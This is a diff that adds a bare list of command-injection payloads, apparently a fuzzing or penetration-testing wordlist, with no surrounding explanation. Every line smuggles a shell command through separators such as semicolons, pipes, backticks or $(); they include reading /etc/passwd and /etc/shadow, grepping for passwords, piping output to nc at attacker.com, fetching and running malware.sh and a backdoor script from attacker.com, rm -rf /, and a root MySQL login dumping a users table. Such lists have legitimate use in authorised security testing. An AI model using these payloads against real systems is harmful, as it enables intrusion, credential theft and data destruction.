@@ -1,0 +1,22 @@
+; ls -la
+; cat /etc/passwd
+; whoami
+; id
+| whoami
+|| id
+&& cat /etc/shadow
+; pwd
+; uname -a
+`whoami`
+$(id)
+; find / -type f -name "*.txt"
+; grep -r "password" /etc/
+; ps aux
+| nc attacker.com 4444
+`curl http://attacker.com/malware.sh | sh`
+; chmod 777 /tmp
+; wget http://attacker.com/backdoor.sh -O /tmp/bd.sh
+; rm -rf /
+|`id`|
+$(whoami)
+; mysql -u root -p12345 -e "SELECT * FROM users"
